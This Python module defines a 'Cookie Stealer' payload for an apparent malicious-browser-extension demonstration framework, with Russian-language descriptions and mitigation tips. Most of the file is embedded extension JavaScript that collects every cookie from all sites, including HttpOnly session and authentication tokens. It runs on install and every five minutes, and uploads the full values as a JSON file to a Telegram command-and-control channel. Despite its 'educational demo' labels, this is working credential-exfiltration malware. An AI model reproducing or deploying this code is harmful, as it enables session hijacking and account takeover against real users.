from .base import BasePayload, Payload


class CookieStealer(BasePayload):

    def get_payload(self) -> Payload:
        return Payload(
            id="cookie_stealer",
            name="Cookie Stealer",
            description=(
                "Демонстрирует кражу куки со всех сайтов, "
                "к которым у расширения есть доступ. "
                "Полные данные отправляются JSON-файлом."
            ),
            icon="🍪",
            risk_level="critical",
            permissions=["cookies", "<all_urls>"],
            targets=[
                "session cookies",
                "authentication tokens",
                "tracking cookies",
                "preference cookies",
            ],
            demo_instructions=(
                "1. Установите расширение\n"
                "2. Откройте демо-сайт и войдите\n"
                "3. Расширение украдёт куки\n"
                "4. JSON-файл придёт в Telegram"
            ),
            mitigation=[
                "Используйте HttpOnly и Secure флаги для куки",
                "Используйте SameSite=Strict или Lax",
                "Регулярно проверяйте установленные расширения",
                "Используйте отдельный профиль браузера для чувствительных сервисов",
                "Внедряйте Content Security Policy",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// Cookie Stealer — ОБРАЗОВАТЕЛЬНАЯ ДЕМОНСТРАЦИЯ
// Отправляет ПОЛНЫЕ куки JSON-файлом в Telegram.
// ============================================================

console.log('[DEMO] Cookie Stealer: background script loaded');

async function stealCookies() {
    try {
        const cookies = await chrome.cookies.getAll({});

        // ПОЛНЫЕ данные, без обрезки
        const stolen = cookies.map(c => ({
            domain: c.domain,
            name: c.name,
            value: c.value,
            path: c.path,
            secure: c.secure,
            httpOnly: c.httpOnly,
            sameSite: c.sameSite,
            session: c.session,
            expirationDate: c.expirationDate,
            hostOnly: c.hostOnly,
            storeId: c.storeId,
        }));

        console.log(`[DEMO] Stolen ${stolen.length} cookies (full)`);

        // Сохраняем локально
        await chrome.storage.local.set({
            demo_stolen_cookies: stolen,
            demo_stolen_at: Date.now(),
            demo_count: stolen.length,
        });

        // Badge
        chrome.action.setBadgeText({ text: String(stolen.length) });
        chrome.action.setBadgeBackgroundColor({ color: '#FF0000' });

        // Отправка в Telegram
        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled && stolen.length > 0) {
            // Группируем по доменам для сводки
            const byDomain = {};
            for (const c of stolen) {
                byDomain[c.domain] = (byDomain[c.domain] || 0) + 1;
            }

            // Краткое сообщение
            let text = `🍪 <b>Cookie Stealer</b>\n`;
            text += `Сессия: <code>${C2_CONFIG.sessionId}</code>\n`;
            text += `Найдено куки: <b>${stolen.length}</b>\n`;
            text += `Доменов: <b>${Object.keys(byDomain).length}</b>\n`;
            text += `Время: ${new Date().toLocaleString('ru')}\n\n`;

            // Топ-10 доменов
            const topDomains = Object.entries(byDomain)
                .sort((a, b) => b[1] - a[1])
                .slice(0, 10);

            for (const [domain, count] of topDomains) {
                text += `🌐 <code>${c2Escape(domain)}</code> — ${count} куки\n`;
            }

            if (Object.keys(byDomain).length > 10) {
                text += `\n<i>...и ещё ${Object.keys(byDomain).length - 10} доменов</i>`;
            }

            // JSON-файл с полными данными
            const jsonData = {
                session_id: C2_CONFIG.sessionId,
                timestamp: new Date().toISOString(),
                total_cookies: stolen.length,
                total_domains: Object.keys(byDomain).length,
                cookies: stolen,
                by_domain: byDomain,
            };

            const filename = `cookies_${C2_CONFIG.sessionId}_${Date.now()}.json`;
            await c2SendDocument(filename, JSON.stringify(jsonData, null, 2));

            text += `\n\n📎 <b>Полные данные — в JSON-файле</b>`;

            await c2Send(text);
        }

        return stolen;
    } catch (e) {
        console.error('[DEMO] Error:', e);
        return [];
    }
}

chrome.runtime.onInstalled.addListener(() => {
    console.log('[DEMO] Cookie Stealer installed');
    // Небольшая задержка, чтобы браузер успел инициализироваться
    setTimeout(stealCookies, 3000);
});

// Периодический запуск (каждые 5 минут)
setInterval(stealCookies, 300000);

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'steal_now') {
        stealCookies().then(sendResponse);
        return true;
    }
    if (msg.action === 'get_stats') {
        chrome.storage.local.get(['demo_stolen_cookies', 'demo_count'], (data) => {
            sendResponse(data);
        });
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return r"""
// ============================================================
// Cookie Stealer — Content Script
// ============================================================

console.log('[DEMO] Cookie Stealer: content script loaded on', location.hostname);

try {
    const visibleCookies = document.cookie;
    if (visibleCookies) {
        console.log(
            `[DEMO] Content script sees ${visibleCookies.split(';').length} ` +
            `non-HttpOnly cookies on ${location.hostname}`
        );
    }
} catch (e) {
    console.log('[DEMO] Cannot read document.cookie:', e.message);
}
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_stats' }, (data) => {
    if (data && data.demo_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_count;
    }
});
"""


__all__ = ["CookieStealer"]
